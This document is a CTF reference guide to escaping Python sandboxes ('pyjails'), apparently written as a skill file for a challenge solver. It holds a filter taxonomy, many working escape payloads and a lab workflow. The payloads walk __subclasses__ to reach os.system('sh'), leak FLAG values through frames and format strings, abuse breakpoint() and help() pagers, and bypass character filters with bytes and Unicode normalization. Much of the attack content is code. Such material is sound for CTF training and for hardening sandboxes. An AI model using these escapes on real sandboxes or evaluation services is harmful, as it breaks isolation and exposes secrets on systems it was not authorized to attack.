# Python jails (pyjail) — taxonomy, payload families, workflow

Every payload below was executed against a local replica on CPython 3.14 unless
marked otherwise. Verify on the challenge's exact version — see Workflow.

## Step 0 — taxonomy: what exactly is blocked?

Read the challenge source. Write one line in `notes.md` per axis; the payload
family follows from the intersection:

| Axis | Typical jail code | What you still have |
|---|---|---|
| exec vs eval | `eval(input())` | single expression only; no statements, no `import` |
| input loop | `while True: eval(input())` | many attempts, errors don't kill you |
| builtins stripped | `eval(s, {"__builtins__": {}})` | literals, operators, attribute access |
| builtins filtered | `safe = {...}; eval(s, {"__builtins__": safe})` | whatever the author kept (enumerate it!) |
| source filter | `if '__' in s: die` / regex denylist | anything the regex misses |
| charset filter | no quotes / no letters / no digits | punctuation + what escapes can build |
| no network | seccomp/offline container | flag is local; read files |
| AST-based filter | `ast.parse`, walk nodes, deny `ast.Import` etc. | whatever node types pass |

Also note: does eval get **custom globals** or inherit the module's? Inherited
globals leak `__loader__`, `__file__`, the module's own functions (see below).

## Step 1 — enumerate primitives

In an input-loop jail, run probes first (each is a legal expression):

```python
1/0                    # error text shows: filter policy, eval vs exec, version hints
().__class__           # attribute access open?
__builtins__           # dict? module? which keys survive?
[x for x in ().__class__.__base__.__subclasses__() if 'sys' in getattr(getattr(x,'__init__',None),'__globals__',{})][:3]
```

Print the keys of whatever builtins survive: `sorted(__builtins__)` or
`sorted(__builtins__.keys())` — half of all pyjails leave `eval`, `exec`,
`getattr`, `compile`, `breakpoint`, or `help` behind by accident.

## Payload families

### A. `__builtins__` recovery (when partially filtered)

If the jail builds a "safe" dict but the real builtins are still reachable,
pull them back. `__builtins__` in a module that is `__main__` is the builtins
*module*; in a custom eval globals dict it is usually a *dict* — handle both:

```python
__builtins__['__import__']('os').system('sh')        # dict form
__builtins__.__import__  # module form, attribute access
```

### B. `__subclasses__` walk (the workhorse; no imports needed)

```python
().__class__.__base__.__subclasses__()
```

Facts (verified 3.14):
- The list contains only classes from **imported** modules. A bare
  `python3 -c 'eval(input())'` has ~170 entries and NO `catch_warnings`/
  `Popen` until `warnings`/`subprocess` are imported somewhere. Always scan
  dynamically, never hardcode indices — they shift with version AND imports.
- `os` is imported at startup (via `site`), so `os._wrap_close` is there:

```python
# direct: __init__.__globals__ IS the os module namespace
[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='_wrap_close'][0].__init__.__globals__['system']('sh')

# or recover full __import__ from os's builtins, then do anything
[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='_wrap_close'][0].__init__.__globals__['__builtins__']['__import__']('os').system('sh')
```

Both verified against `eval(s, {"__builtins__": {}})` — no builtins needed.

- Scan for any interesting module by globals keys (works when `subprocess`
  got imported by the jail itself):

```python
[c for c in ().__class__.__base__.__subclasses__() if 'Popen' in getattr(getattr(c,'__init__',None),'__globals__',{})]
```

- `warnings.catch_warnings` (if warnings imported): `.__init__.__globals__`
  contains `sys` and `__builtins__`.

- `__globals__` string filtered but attribute access open? Reach it by getattr
  with a built-string (family G): `getattr(c.__init__, bytes([95,95,103,108,111,98,97,108,115,95,95]).decode())`

### C. Frames via `sys` — read the jail module's globals

`sys` is importable by name in os's globals (verified):

```python
# leak the FLAG the jail module holds (frame index varies: 1-3; try them)
[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='_wrap_close'][0].__init__.__globals__['sys']._getframe(2).f_globals['FLAG']
```

Exception variant (needs statements, i.e. family E or a real `exec`):

```python
try: 1/0
except Exception as e:
    e.__traceback__.tb_frame.f_back.f_globals        # caller's globals
    # sys.exc_info()[2].tb_frame.f_back.f_globals    # same, if sys in scope
```

Both verified. Use to dump `f_globals['__builtins__']`, `f_locals`, `FLAG`.

### D. `eval`/`compile` route — statements from an expression

`eval` accepts **any** code object, including exec-mode ones (verified):

```python
eval(compile("import os; os.system('sh')", "<s>", "exec"))   # returns None
```

Precondition: `eval` and `compile` reachable (builtins present). Also the
standard trick to bypass "eval only takes expressions" policies.

### E. `breakpoint()`, `help()`, `license()`, `input()` re-entry

| Primitive | Mechanism | Preconditions |
|---|---|---|
| `breakpoint()` | enters pdb; type `import os; os.system('sh')` at the `(Pdb)` prompt | `breakpoint` in builtins; works even with piped stdin; disabled if `PYTHONBREAKPOINT=0` |
| `help()` | pydoc help → long output pages through `less` when stdout is a tty → `!sh` inside less | pager present on host and not secure mode (`LESSSECURE=1` blocks `!`). Not verifiable on this authoring host (no less); treat as opportunistic |
| `license()` | long text pages the same way | same caveat |
| `input()` | payload `eval(input())` — the outer filtered line is just `eval(input())`; the NEXT line, read by the inner `input()`, is not filtered | jail loops over `eval(input())` or similar |
| `__import__` alternates | `importlib.import_module` when importlib survives; usually gone with `__import__` | check `sorted(__builtins__)` |

### F. Format-string walk (SSTI-style; reads, never calls)

`str.format` field names walk attributes and indexes — with NO python
identifiers in your source:

```python
"{0.__class__}".format(())                       # <class 'tuple'>
"{0.__class__.__base__}".format(())
"{0.__init__.__globals__[FLAG]}".format(some_jail_object)   # data leak, verified
```

Verified leak: instantiate any class the jail module defines, then read its
`__init__.__globals__` (that IS the jail module's namespace):

```python
"{0.__init__.__globals__[FLAG]}".format([c for c in ().__class__.__base__.__subclasses__() if c.__name__=='Cute'][0]())
```

Limits (verified): attribute + `[key]`/`[0]` indexing only — **cannot call**
methods, and `format(0, "__class__")` raises ValueError (int format specs are
printf-like, no attribute walking). Best against jails that `print(user.format(x))`
or for leaking globals when execution escapes fail.

### G. Character filters

No quotes (verify: `'` and `"` rejected) — build strings from bytes:

```python
eval(bytes([105,109,112,111,114,116,32,111,115]).decode())    # import os
# chr() join equivalent if chr survives:  ''.join(map(chr,[...])) needs quotes for '' — prefer bytes().decode()
```

`__` filtered — put dunders behind escapes the checker does not decode:

```python
getattr(o, "\x5f\x5fclass\x5f\x5f")     # \x5f == '_' ; compile-time escape, source never contains '__'
```

Caveat: a checker that runs `input.encode().decode('unicode_escape')` (or NFKC)
before filtering sees the decoded text — then this fails. Test with a probe:
`"\x5f"` rejected or not?

No letters (regex `[a-zA-Z]`) — unicode identifier normalization (PEP 3131).
CPython NFKC-normalizes identifiers at compile time, so non-ASCII letters work:

```python
𝐩𝐫𝐢𝐧𝐭(1)          # U+1D431 math-bold 'p' etc. — verified executes on 3.14
```

Truth table (mechanism verified on 3.14):

| Checker behavior | Fullwidth/math letters in payload | Outcome |
|---|---|---|
| raw substring filter, no normalization | `𝗂𝗆𝗉𝗈𝗋𝗍` | bypass: filter misses, tokenizer normalizes |
| NFKC-normalizes input, then filters | same | blocked: normalization happens on the whole input string — BUT only identifiers get normalized by CPython; string literals keep raw codepoints, so payload text inside `chr()`-built strings is immune |
| runs the payload itself | — | NFKC applies at compile of identifiers only, never to string contents |

`＿` (U+FF3F FULLWIDTH LOW LINE) NFKC-normalizes to `_` (verified via
`unicodedata.normalize`) — usable for `__class__` as `＿＿ｃｌａｓｓ＿＿` when the
mechanism above applies.

Digits banned: `True`/`len()` arithmetic, `' ' * n` from single chars.

### H. `__loader__` / import machinery (lazy jails only)

When eval **inherits module globals** (no custom dict), `__loader__` is a
`SourceFileLoader` (verified in scripts):

```python
__loader__.__init__.__globals__['sys'].modules['os'].system('sh')    # verified
```

With custom globals `{"__builtins__": ...}` the name is gone (verified: None).
`importlib` itself, if present, gives `importlib.import_module('os')` or
`importlib.util.find_spec`.

## Version-aware warnings

| Change | Versions | Jail impact |
|---|---|---|
| `__subclasses__` indices/order | every minor | never hardcode; scan by `__name__`/globals keys |
| `imp` module, `loader.load_module`, `distutils` | removed in 3.12 | old writeup payloads using them fail on 3.12+ |
| `__builtins__` module vs dict | all | module in `__main__` scripts, usually dict in eval globals — write both probes |
| frame objects lazy | 3.11+ | attribute access still works, no payload change; just don't trust `repr(frame)` |
| Everything on this page | verified 3.14 | mechanics stable 3.8–3.14 for families A–H except removals above; still replicate exact version |

## Workflow — replicate, enumerate, iterate mechanically

1. **Replicate locally, exactly.** Copy the jail source into the challenge dir,
   then run it under the challenge's interpreter:

```bash
skills/ctf-misc/scripts/pyjail-lab.sh 3.11 jail.py    # podman python:3.11-slim, offline
skills/ctf-misc/scripts/pyjail-lab.sh 3.8  jail.py    # match remote version
skills/ctf-misc/scripts/pyjail-lab.sh --system jail.py
```

2. **Enumerate** surviving builtins and reachable classes (probes above).
3. **Iterate payloads mechanically**: one payload per line in `payloads.txt`,
   feed with a loop, log every attempt + exact error in `notes.md`. An error
   message is an oracle — `NameError: name 'x' is not defined` tells you the
   filter let the token through; `SyntaxError` means string mangling.
4. Escalate: builtins leak → subclass walk → frames → format leak. Once
   `os.system`/`Popen` runs, switch to flag hunting (`ctf` skill).
5. Remote: only after local success, and respecting the remote gate in `ctf`.

## Local lab snippet (throwaway jail for payload testing)

```python
# minijail.py — tweak to mirror the challenge's exact filter
import re
SAFE = {}
while True:
    s = input("> ")
    if re.search(r"__|import|flag", s):
        print("rejected"); continue
    try:
        print(eval(compile(s, "<j>", "eval"), {"__builtins__": SAFE}))
    except Exception as e:
        print(type(e).__name__, e)
```
